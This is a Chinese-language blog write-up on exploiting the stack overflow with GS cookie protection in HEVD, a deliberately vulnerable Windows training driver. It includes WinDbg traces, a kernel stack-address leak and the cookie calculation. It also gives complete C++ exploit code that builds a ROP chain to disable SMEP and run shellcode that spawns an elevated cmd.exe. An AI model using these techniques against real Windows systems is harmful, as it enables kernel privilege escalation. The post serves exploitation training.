<!DOCTYPE html><html lang="zh"><head><meta charset="UTF-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Joe1sn's Cabinet | 【Win Pwn】HEVD-内核栈溢出GS保护及绕过</title><meta name="description" content="&lt;p&gt;HEVD中的栈溢出加上GS保护&lt;br /&gt;
还有一个知识点就是windows内核栈地址泄露&lt;/p&gt;"><link rel="icon" href="/images/favicon.png"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Source+Sans+Pro:400,700"><link rel="stylesheet" href="/css/highlights/darkula.css"><link rel="stylesheet" href="/css/main.css"><link rel="search" type="application/opensearchdescription+xml" href="https://joe1sn.eu.org/atom.xml" title="Joe1sn's Cabinet"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Joe1sn's Cabinet" type="application/atom+xml">
</head><body><div class="container"><header class="main-header"><h1 class="main-header__title uplize"><a class="main-header__title__link" href="/">Joe1sn's Cabinet</a></h1><nav class="main-header__nav"><ul class="main-nav"><li class="main-nav__list"><a class="main-nav__list__link" href="/" target="_self">HOME</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="/archives/" target="_self">ARCHIVE</a></li><li class="main-nav__list"><a class="main-nav__list__link" href="https://github.com/Joe1sn" target="_blank">GITHUB</a></li></ul></nav></header><main class="container__wrapper"><article class="article post"><h3 class="article__title">【Win Pwn】HEVD-内核栈溢出GS保护及绕过</h3><div class="article__date metadata"><div class="post-info">2024/02/24</div></div><div class="article__tags metadata">Tags:
<a class="article__tags__link metadata" href="/tags/kernel/">kernel</a><a class="article__tags__link metadata" href="/tags/windows/">windows</a><a class="article__tags__link metadata" href="/tags/pwn/">pwn</a></div><div class="article__body"><p>HEVD中的栈溢出加上GS保护<br />
还有一个知识点就是windows内核栈地址泄露</p>
<span id="more"></span>
<p>函数功能</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a1743db93e122898948550a845f7d04f.png" alt="image-20240124203451123" /></p>
<p>在上三篇中讲的很清楚了，这里我关闭了KVAS</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/21407e450615457821bd83e162b53ecc.png" alt="image-20240124203542280" /></p>
<p>又是一段经典的栈溢出，但是有了内核的GS保护</p>
<h1 id="编写exploit"><a class="markdownIt-Anchor" href="#编写exploit"></a> 编写exploit</h1>
<p>这里就不得不提到Windows中一种Cannary的绕过方式了，通过try except的Handler进行绕过，很遗憾handler只在32位程序中才保存在栈上</p>
<p>查阅资料</p>
<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/2017/#22">https://paper.seebug.org/2017/#22</a></p>
<p><a target="_blank" rel="noopener" href="https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html">https://kristal-g.github.io/2021/02/07/HEVD_StackOverflowGS_Windows_10_RS5_x64.html</a></p>
<p>cookie值是存储在<code>_data</code>段的第一个</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/1c6b200d43a1bc05250cfd066d6c2991.png" alt="image-20240124215049718" /></p>
<p>函数检查的部分，有一个异或</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fb17ff5c2760ddac222db2dda25f7b7f.png" alt="image-20240124215249257" /></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; dqs rsp</span><br><span class="line">ffff8788`21979540  00000000`00000000</span><br><span class="line">ffff8788`21979548  ffffc186`261f98f0</span><br><span class="line">ffff8788`21979550  ffffc186`269c86b0</span><br><span class="line">ffff8788`21979558  00000000`80000004</span><br><span class="line">ffff8788`21979560  00000000`00000000</span><br><span class="line">ffff8788`21979568  fffff804`2a4d66e5 HEVD!TriggerBufferOverflowStackGS+0x5 [c:\projects\hevd\driver\hevd\bufferoverflowstackgs.c @ 70]</span><br><span class="line">ffff8788`21979570  00000000`00000000</span><br><span class="line">ffff8788`21979578  00000000`00000003</span><br><span class="line">ffff8788`21979580  54535f57`4f4c4652</span><br><span class="line">ffff8788`21979588  ffffc186`1f93206c</span><br><span class="line">ffff8788`21979590  00000000`00000000</span><br><span class="line">ffff8788`21979598  00000000`00000000</span><br><span class="line">ffff8788`219795a0  00000000`00000000</span><br><span class="line">ffff8788`219795a8  00000000`00000000</span><br><span class="line">ffff8788`219795b0  ffff8788`219796a0</span><br><span class="line">ffff8788`219795b8  00000000`00000000</span><br><span class="line"></span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=0000ad1068899811</span><br><span class="line"></span><br><span class="line">1: kd&gt; s rsp L1000 07 20 22</span><br><span class="line">ffff8788`219797e8  07 20 22 00 00 00 00 00-20 0d 07 27 86 c1 ff ff  . &quot;..... ..&#x27;....</span><br><span class="line">ffff8788`21979988  07 20 22 00 86 c1 ff ff-00 00 00 00 00 00 00 00  . &quot;.............</span><br><span class="line">ffff8788`21979a48  07 20 22 00 ff ff ff ff-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">ffff8788`21979ab8  07 20 22 00 00 00 00 00-30 e8 d9 1f 07 00 00 00  . &quot;.....0.......</span><br><span class="line">1: kd&gt; ? ffff8788`219797e8-rsp</span><br><span class="line">Evaluate expression: 680 = 00000000`000002a8</span><br></pre></td></tr></table></figure>
<ol>
<li>
<p>利用之前的<code>ulGetBase</code>得到<code>HEVD.sys</code>的基地址</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dqs  0xfffff80522fe0000+3000</span><br><span class="line">fffff805`22fe3000  00006fd9`604347b3</span><br><span class="line">fffff805`22fe3008  ffff9026`9fbcb84c</span><br></pre></td></tr></table></figure>
<p>再下断点看看是不是为这个值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; g</span><br><span class="line">Breakpoint 0 hit</span><br><span class="line">HEVD!TriggerBufferOverflowStackGS+0x1b:</span><br><span class="line">fffff805`230666fb 4833c4          xor     rax,rsp</span><br><span class="line">1: kd&gt; r rax</span><br><span class="line">rax=00006fd9604347b3</span><br></pre></td></tr></table></figure>
<p>还真是，那么访问<code>base+3000</code>就可以得<code>cookie</code>值</p>
</li>
<li>
<p>如何读取？这个还真没办法，只能利用另外一个漏洞<code>HEVD_IOCTL_ARBITRARY_WRITE</code>，将该值修改为我们自己的值，也可以设置<code>Ring3ToKernel</code>中的一个地址的值为待写入的地方，然后利用这个漏洞将<code>cookie</code>写入</p>
</li>
<li>
<p><code>key</code>值位于<code>rsp</code>上，利用<code>NtQuerySystemInformation</code>中的<code>PSYSTEM_EXTENDED_PROCESS_INFORMATION</code>可以得到，</p>
<p>但是后面又看不了了，这个时候我想了下，一个exp可以看到另外一个exp的栈地址，但是查看自身的时候已经不在上面了，或许改为线程执行可以？</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/afed146baf184820b89d608a1d389bea.png" alt="image-20240224093858858" /></p>
<p>就用这种方法试试看</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[+] Found Ring3ToKernel.exe</span><br><span class="line">Stack base 0xffffef8360dce000   Stack limit 0xffffef8360dc8000</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/2bbb268241ad0b8cb84e109543a4d1c3.png" alt="image-20240224101543720" /></p>
<p>偏移是一个定值，再回忆一下之前的cookie生成算法就能得cookie了<br />
但是有个小问题，合成cookie时，rsp值变化了</p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/a8a2278b4ba72209556e3640b3b8b4ff.png" alt="image-20240224103819644" /><br />
考虑到push和sub所以：rsp = stack base - 0x868 - 0x258</p>
<p>此实，key值为：0000768c469d2a88，rsp = ffffef83619aa798，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x0000768c469d2a88^(0xffffef83619aa798-0x258))</span><br><span class="line">&#x27;0xffff990f27078fc8&#x27;</span><br></pre></td></tr></table></figure>
<p>得到cookie值为<code>0xffff990f27078fc8</code></p>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/708fcb6fd0aa1439e655314f5cb7e5ad.png" alt="image-20240224103938531" /></p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">&#123;</span><br><span class="line">	funcaddr* What;</span><br><span class="line">	funcaddr* Where;</span><br><span class="line">&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">funcaddr value = <span class="number">0</span>;</span><br><span class="line">pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">payload-&gt;Where = &amp;value;</span><br><span class="line">DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">DWORD info = <span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">	payload, size,</span><br><span class="line">	<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">	&amp;info, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>然后就是经典常规栈溢出+ROP打法</p>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD oldProtect;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">	LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">		<span class="built_in">sizeof</span>(cmd),</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">ulGetStackLimit</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">	funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">	funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">	funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">	funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">	funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">	&#123;</span><br><span class="line">		funcaddr* What;</span><br><span class="line">		funcaddr* Where;</span><br><span class="line">	&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">	funcaddr value = <span class="number">0</span>;</span><br><span class="line">	pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">	payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">	payload-&gt;Where = &amp;value;</span><br><span class="line">	DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">	DWORD info = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">		payload, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">	funcaddr rsp = <span class="number">0</span>;</span><br><span class="line">	<span class="built_in">scanf_s</span>(<span class="string">&quot;%llx&quot;</span>, &amp;rsp);</span><br><span class="line">	rsp -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line">	rsp ^= value;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, rsp);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">	<span class="comment">//RtlFillMemory(stackspace, 0x238, &#x27;A&#x27;);</span></span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	size = <span class="number">0x258</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)rsp;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">		stackspace, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/04085ad653545f1461b7b9f567e10b46.png" alt="image-20240224121139780" /></p>
<h1 id="微调exploit"><a class="markdownIt-Anchor" href="#微调exploit"></a> 微调exploit</h1>
<ul>
<li>
<p>shellcode得仔细调整rsp值</p>
<p>很简单，和最开的是栈溢出一样，直接一个push两个ret，让rsp+0x28变成了rsp+0x10</p>
</li>
<li>
<p>还有就是泄露内核栈地址的时候得稳定，让其包含当前进程</p>
<p>我的解决方法简单粗暴，多线程和直接加<code> system(&quot;pause&quot;);</code>，重新弄好的方案都能打包成一个函数了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> <span class="title">ulUseStackInfo</span><span class="params">(<span class="type">wchar_t</span> ProcName[])</span> </span>&#123;</span><br><span class="line">	pStackInfo stackinfo = (pStackInfo)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(StackInfo));</span><br><span class="line">	<span class="keyword">if</span> (stackinfo == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t allocate memory\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	stackinfo-&gt;ModuleName = ProcName;</span><br><span class="line">	stackinfo-&gt;result = <span class="number">0</span>;</span><br><span class="line">	HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0x100</span>, (LPTHREAD_START_ROUTINE)ulGetStackLimit, stackinfo, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[!] Can&#x27;t get thread\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="built_in">WaitForSingleObject</span>(hThread, INFINITE);</span><br><span class="line">	funcaddr baseaddr = stackinfo-&gt;result;</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">	<span class="built_in">free</span>(stackinfo);</span><br><span class="line">	<span class="keyword">return</span> baseaddr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>最终exp</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">StackOverflowGS</span><span class="params">(HANDLE hDevice, <span class="type">unsigned</span> <span class="type">int</span> ioctl)</span> </span>&#123;</span><br><span class="line">	<span class="type">char</span> stackspace[<span class="number">0x1000</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	DWORD oldProtect;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Start Exploit\n&quot;</span>);</span><br><span class="line">	LPVOID shellcode_addr = <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">		<span class="built_in">sizeof</span>(cmd),</span><br><span class="line">		MEM_COMMIT | MEM_RESERVE,</span><br><span class="line">		PAGE_EXECUTE_READWRITE);</span><br><span class="line">	<span class="built_in">memcpy</span>(shellcode_addr, cmd, <span class="built_in">sizeof</span>(cmd));</span><br><span class="line"></span><br><span class="line">	funcaddr stack_base = <span class="built_in">ulUseStackInfo</span>(<span class="string">L&quot;Ring3ToKernel.exe&quot;</span>);</span><br><span class="line">	funcaddr base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;ntoskrnl.exe&quot;</span>);</span><br><span class="line">	funcaddr pop_rcx = base + <span class="number">0x20C64C</span>;</span><br><span class="line">	funcaddr mov_cr4_rcx = base + <span class="number">0x39eb47</span>;</span><br><span class="line">	funcaddr hevd_base = <span class="built_in">ulGetKernelBase</span>((PCHAR)<span class="string">&quot;HEVD.sys&quot;</span>);</span><br><span class="line">	funcaddr cookie_addr = hevd_base + <span class="number">0x3000</span>;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie Address 0x%llx\n&quot;</span>,cookie_addr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Atribute Write GET key value\n&quot;</span>);</span><br><span class="line">	<span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_WRITE_WHAT_WHERE</span></span><br><span class="line">	&#123;</span><br><span class="line">		funcaddr* What;</span><br><span class="line">		funcaddr* Where;</span><br><span class="line">	&#125;arbitrary_write, * pArbitraryWrite;</span><br><span class="line">	funcaddr value = <span class="number">0</span>;</span><br><span class="line">	pArbitraryWrite payload = (pArbitraryWrite)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(arbitrary_write));</span><br><span class="line">	payload-&gt;What = (funcaddr*)cookie_addr;</span><br><span class="line">	payload-&gt;Where = &amp;value;</span><br><span class="line">	DWORD size = <span class="built_in">sizeof</span>(payload);</span><br><span class="line">	DWORD info = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, <span class="number">0x22200B</span>,</span><br><span class="line">		payload, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Key value 0x%llx\n&quot;</span>, value);</span><br><span class="line"></span><br><span class="line">	funcaddr cookie = <span class="number">0</span>;</span><br><span class="line">	stack_base -= (<span class="number">0x868</span> + <span class="number">0x258</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] RSP value 0x%llx\n&quot;</span>, stack_base);</span><br><span class="line"></span><br><span class="line">	cookie = stack_base ^ value;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Cookie value 0x%llx\n&quot;</span>, cookie);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Start set ROP\n&quot;</span>);</span><br><span class="line">	<span class="built_in">RtlFillMemory</span>(stackspace, <span class="number">0x200</span>, <span class="string">&#x27;A&#x27;</span>);</span><br><span class="line">	size = <span class="number">0x258</span>;</span><br><span class="line">	<span class="comment">//size = 0x200;</span></span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x200</span>) = (funcaddr)cookie;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x208</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x210</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x218</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x220</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x228</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x230</span>) = (funcaddr)<span class="number">0x00000000</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x238</span>) = (funcaddr)pop_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x240</span>) = (funcaddr)<span class="number">0x00000000002506f8</span>;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x248</span>) = (funcaddr)mov_cr4_rcx;</span><br><span class="line">	*(funcaddr*)(stackspace + <span class="number">0x250</span>) = (funcaddr)shellcode_addr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[*] Spawning a new cmd.exe process\n&quot;</span>);</span><br><span class="line">	<span class="built_in">DeviceIoControl</span>(hDevice, ioctl,</span><br><span class="line">		stackspace, size,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;info, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;cmd.exe&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://img-1300594400.cos.ap-shanghai.myqcloud.com/uploads/big/fd9a8491ecc46c58eb2957ca7579ab55.png" alt="image-20240224140007704" /></p>
</div></article><div class="pagination"><a class="pagination__link pagination__prev" href="/2024/02/25/PeFile/">prev_post</a><a class="pagination__link pagination__next" href="/2024/02/23/win-hevd-exp-arbitrary-write/">next_post</a></div></main><footer class="footer metadata"><p class="footer__text">© 2025 Joe1sn</p><p class="footer__text">Powered by <a class="footer__text__link" href="https://hexo.io/" target="_blank">Hexo</a> &amp; <a class="footer__text__link" href="https://pages.github.com/" target="_blank">Github Page</a></p></footer></div></body></html>